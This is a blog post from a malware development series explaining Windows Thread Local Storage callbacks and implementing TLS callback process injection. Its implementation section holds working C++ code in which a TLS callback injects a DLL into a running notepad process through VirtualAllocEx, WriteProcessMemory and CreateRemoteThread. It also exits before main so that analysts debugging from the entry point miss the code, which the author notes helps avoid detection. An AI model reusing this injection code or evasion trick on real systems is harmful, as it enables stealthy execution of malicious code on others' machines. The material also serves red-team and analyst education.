---
title: 'Malwares Development Series | Part 4 : Process Injection | TLS Injection'
published: 2024-08-16
description: ''
image: ''
tags: ['Malwares', 'CTF', 'Forensics', 'DFIR', 'RedTeam', 'BlueTeam', 'APT', 'Threat Hunting']
category: 'Malwares'
draft: false 
---

![backgr]("/favicon/tlsinj1.gif")
    

Welcome back to a new Process Injection technique : Thread Local Storage Injection where i'll cover its implementation and how it works.
During this blog, we'll follow this plan :

- **What is TLS Injection ?**  
- **How TLS Injection works ?**
- **TLS Injection Implementation**

Lets start.

# What is TLS Injection ?

## TLS / TLS Callbacks

First what is a TLS ?

Thread Local Storage or (TLS) is a mechanism that allows threads within the same process to have their own unique data. 
Unlike global or static variables that are shared across all threads, TLS provides a way for each thread to have its own copy of a variable, enabling thread-specific storage. This is particularly useful in multithreaded applications where each thread needs to maintain its own state or data, independent of other threads.

So what we really should know is that in Windows, TLS is implemented using the operating system's support for threading. When a thread is created, it is allocated its own TLS area, which can store variables that are unique to that thread. 
So the system manages the allocation and cleanup of TLS data automatically as threads are created and destroyed.

So until now, we defined the TLS, lets get familiarized with `TLS Callbacks`.

One of the advanced features of TLS in Windows is the ability to specify TLS callbacks. TLS callbacks are special functions that are automatically called by the operating system at specific points in the lifetime of a thread. For example lets take the main ones :

`DLL Load` : In this case, when a DLL is loaded, and a thread is created, the TLS callback is invoked.

`Thread Creation` : When a new thread is created within the process, the TLS callback is invoked for that thread.

`Thread Exit` : Also when a thread exits, the TLS callback is invoked to clean up any TLS data.

`DLL Unload` : When the DLL is unloaded, the TLS callback is invoked.

These are the main actions when a TLS callback is called. Now, the most question that might be confusing you is Where these callbacks can be ?. Well The PE structure is the key to this one.

As I mentioned in the previous blog, a PE format is the file format for executables, object code, and DLLs in Windows operating systems, it is a data structure that encapsulates the information necessary for the Windows OS loader to manage the wrapped executable code.

You can refer to the previous blog for more infos. So almost of windows related files are PE, and TLS has a specific section on this PE files which is .tls that define and manage variables that are unique to each thread in a process as we said before.
So lets uncover this TLS section to know more.

**.tls section**:

Imagiine that the form of .tls section is :

| Section                    |
|-----------------------------|
| TLS Directory               |
| TLS Callbacks Array         |
| TLS Data                    |
| Zero-Fill Area (if any)      |


The `.tls` section in a Portable Executable (PE) file has a specific format that includes a structure known as the TLS Directory `IMAGE_TLS_DIRECTORY`, which describes the various elements related to Thread Local Storage (TLS).

```cpp
typedef struct _IMAGE_TLS_DIRECTORY {
    DWORD   StartAddressOfRawData;   // RVA of the start of the TLS data
    DWORD   EndAddressOfRawData;     // RVA of the end of the TLS data
    DWORD   AddressOfIndex;          // Address of the TLS index
    DWORD   AddressOfCallBacks;      // Address of the array of TLS callback functions
    DWORD   SizeOfZeroFill;          // Size of zero-fill area
    DWORD   Characteristics;         //  Reserved, typically zero
} IMAGE_TLS_DIRECTORY;
```
Lets understand what each pointer mean and it purpose:

- **StartAddressOfRawData** is a field that contains the Relative Virtual Address `RVA` of the beginning of the TLS data in the PE file.

- **EndAddressOfRawData** for `RVA` of the end of the TLS data in the PE file.

- **AddressOfIndex** points to a location where the thread-specific TLS index is stored. This index is used by the operating system to reference the TLS data for each thread.

- **AddressOfCallBacks** is the address of an array of pointers to TLS callback functions. These functions are called by the operating system during specific events, such as thread creation or exit. ( Interesting )

- **SizeOfZeroFill**
This field specifies the size of the area to be zeroed out in the TLS data section. It’s used for initializing TLS data with zeros.

This TLS Directory is a key structure within the .tls section because it provides these necessary information for the operating system to manage TLS data for each thread.

Next structure in the .tls section is the TLS callbacks, which is an array of function pointers that the operating system automatically invokes at specific times in the lifecycle of a thread. These callbacks are used for initializing or cleaning up thread-specific data.. 
This arrays is null-terminated, meaning that the last pointer in the array is a `NULL` pointer. 

```cpp
PIMAGE_TLS_CALLBACK tls_callbacks[] = {
    CallbackFunction1,
    CallbackFunction2,
    // ... more callbacks
    NULL  // End of the array
};
```
The array is stored at the address specified by the `AddressOfCallBacks` field in the `IMAGE_TLS_DIRECTORY` structure. Each entry in the array points to a callback function that will be invoked during certain thread events.

After the TLS Callbacks structure we find the TLS Data, the actual data that is used as thread-local storage is located between the `StartAddressOfRawData` and `EndAddressOfRawData` fields specified in the `IMAGE_TLS_DIRECTORY`. Each thread gets its own copy of this data when it is created.

For The `SizeOfZeroFill` field, it indicates the size of the additional data that needs to be zeroed out when the TLS data is allocated for a thread. This area is filled with zeros by the operating system.

Our interest in this blog falls on the first two section parts TLS Diretory and TLS Callbacks, I encourage you to do your research about the others.

To finalize this part i will give you a small example of a PE execution and its steps to understand more :

Let's consider a simple Windows program called example.exe, which has been compiled from C++ code. This executable has a .tls section that initializes thread-local variables and contains a TLS callback to perform some setup whenever a new thread is created.

1. Loading the PE File into Memory
When example.exe is double-clicked or otherwise executed, the Windows loader begins by mapping the PE file into the process's memory.
The loader reads the PE header to determine the layout of the executable, including the location of different sections like .text (code), .data (initialized data), .rdata (read-only data), and .tls (Thread Local Storage).

2. Setting Up Thread Local Storage (TLS)
The loader identifies the `.tls` section based on the information in the PE header, specifically the `IMAGE_TLS_DIRECTORY` structure.
If the .tls section is present, the loader allocates memory for the TLS data for the initial thread (the main thread) of the process.
The initial values for the TLS variables are copied from the `.tls` section in the PE file into the allocated memory for the main thread.

3. Invoking TLS Callbacks
If the .tls section includes a TLS Callbacks Array, the loader invokes each callback function in the array with the `DLL_PROCESS_ATTACH` reason.
These callbacks allow the application to perform any necessary initialization that must occur before the main code runs.
Now i think that with this small knowledge, you can catch the coming part of the implementation.

## TLS Injection and how it works ?

So referring to MITRE, TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point.

- **How It Works**

First we should identify the .tls Section that i explained before, which is designed to hold thread-specific data and TLS callbacks. After identifying the .tls, we can simply injects our malicious code by modifying TLS callback functions or creating new ones. These callbacks are executed automatically by the operating system during specific thread-related events (e.g., thread creation, thread termination).

Lets see this in action.

## Implementation

So in this demo i will test the TLS callbacks injection on notepad to trigger a DLL Injection, and as usuall i will devide this to several steps.

- **Needed libraries**

```cpp
#include "windows.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream.h>

```

- **TLS Callback declaration**

```cpp
void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved);
```

This declares the TLS callback function, which is executed when the application starts, before the main function.
In the NTAPI function, ```DllHandle``` is a parameter that represents a handle to the DLL. It is typically used in DLL functions to get the handle to the DLL instance that is being loaded or unloaded.
Same for ```Reason```, which is a parameter that indicates the reason why the TLS callback is being called. It can have different values such as:

`DLL_PROCESS_ATTACH`: The DLL is being loaded into the address space of the process.
`DLL_THREAD_ATTACH`: A new thread is being created in the process.
`DLL_THREAD_DETACH`: A thread is exiting cleanly.
`DLL_PROCESS_DETACH`: The DLL is being unloaded from the address space of the process.

- **Setup PE structure**

```cpp
__attribute__((section(".CRT$XLB"))) PIMAGE_TLS_CALLBACK pTLSCallback = TlsCallback;
```
This GCC/Clang specific attribute ```__attribute__((section(".CRT$XLB")))``` tells the compiler to place the variable into a specific section of the PE (Portable Executable) file named ```.CRT$XLB```.

Now time to learn a TIP, You probably asking your self what is ```.CRT$XLB```, so ```.CRT$XLB``` is a special section in a PE file reserved for CRT (C Runtime) initialization functions. The sections ```.CRT$XLA``` to ```.CRT$XLZ``` are used to store pointers to functions that the system or runtime calls during process/thread initialization or termination.

I want you to keep that in mind.

In our case, the ```.CRT$XLB``` section is used for TLS callbacks. Functions in this section are called by the Windows loader when a new thread starts or exits in the process, before any user code is run. These are typically used for thread initialization purposes.

Now the rest of the line has a purpose to define the Callback ```TLS callback PIMAGE_TLS_CALLBACK pTLSCallback = TlsCallback;```.
This assigns the TLS callback function TlsCallback to the variable pTLSCallback. This means the function TlsCallback will be called automatically by the system whenever a thread is created or destroyed.

This is a typedef for a pointer to a function that serves as a TLS callback :

```cpp
typedef VOID (NTAPI *PIMAGE_TLS_CALLBACK)(
    PVOID DllHandle,
    DWORD Reason,
    PVOID Reserved
);
```

- **Injection**

So now we can start writing our Callback function to trigger the DLL Injection.
```cpp
void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved)
{
    int pid = 4288; // i put this for notepad
    HANDLE handle_proc = NULL;

    if (pid) {
        handle_proc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                  PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                                  FALSE, (DWORD)pid);

        if (handle_proc != NULL) {
            injection(handle_proc);
            CloseHandle(handle_proc);
        }
    }

    ExitProcess(0);
}
```
So as you see it's a simple caller to the function injection that will serve the DLL Injection, BUUUT Note the ```ExitProcess``` at the end, so from here we can conclude that the main function will never be executed. This is good for avoiding detection huh? while  a malware analyst is always start debugging from the entry point HAHA, Just kidding.

Passing now to the Injection function which we did cover it in the first blog of these series. 
So we will inject our malicious DLL in notepad ( legitimate process ).
```cpp
int injection(HANDLE hProcess) {
    const char* dllPath="C:\\Users\\agoum\\Downloads\\TLSInjection\\InjectedDLL.dll";
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pRemoteMemory) {
        CloseHandle(hProcess);
        return 0;
    }

    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMemory, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }
    MessageBoxW(NULL, L"Thread created", L"TLS injection", 0);

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```
feel free to visit the first blog if you dont understand it. for the DLL it just contain a message box.

```cpp
#include <windows.h>

extern "C" __declspec(dllexport) void InjectedFunction() {
    MessageBoxA(NULL, "You've been hacked by Sn4ke Ey3s", "From TLS Callback", MB_OK);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        InjectedFunction();
    }
    return TRUE;
}
```

To compile this dll use ```g++ -o InjectedDLL.dll InjectedDLL.cpp```



